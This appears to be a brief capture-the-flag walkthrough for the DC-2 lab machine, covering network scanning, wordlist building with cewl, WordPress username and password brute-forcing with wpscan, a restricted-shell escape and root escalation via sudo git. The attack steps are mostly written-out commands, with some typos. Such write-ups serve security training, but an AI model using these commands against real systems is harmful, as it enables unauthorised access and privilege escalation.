ip a 

netdiscover -r <0.0.0.1/24>

nmap -sV <ip>

nano /etc/hosts (In that add the ip and name it as dc-2) This will give you the access to browse it on browser.

In that you will find the flag 1 as : Your usual wordlists probably won’t work,so instead, maybe you just need to be cewl.

Most passwords is always better, but sometimes you just cannot win them all.

Login as one to see the next flag.

If you can’t find it , log in as another.

[Brief description about the flag]

cewl http://dc-2/ -2 password\ dc-02.txt

wpscan —url http://dc-2 -e u [ u is used for enummeration]

wpscan —url http://dc-2 -e p [p is used for plugins]

wpscan —url http://dc-2 -e t [t is used for themes]

nikto -h http://sc-2/

wpscan —url http://dc-2/ —usernames <username.txt> —passwords <passwords.txt>

This will crack the usernames password and give the result

ssh jerry@<ip> -p 7744 because port 22 connection refused

password of jerry obtained from wpscan 

ls —> flag3.txt & usr

cat flags3.txt . It will say cat: command not found

/bin/cat flag3.txt . It will say /usr/bash/cat: restricted: cannot specify ‘/’ in command names

echo $PATH —> /home/tom/usr/bin

export PATH=/bin:/usr/bin:$PATH

export SHELL=/bin/bash:$SHELL

ls

cat flag3.txt (Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

su jerry:

password of jerry

ls (Permission denied)

sudo -l  (Matching Defaults entries for jerry on DC-2:

env_reset, mail_badpass,

secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User Jerry may run the following commands on DC-2:

(root) NOPASSWD: /usr/bin/git

sudo git -p help config

!bash (it will give the root permission)

whoami —> root

cd /root —> ls 

final-flag.txt

Well done !
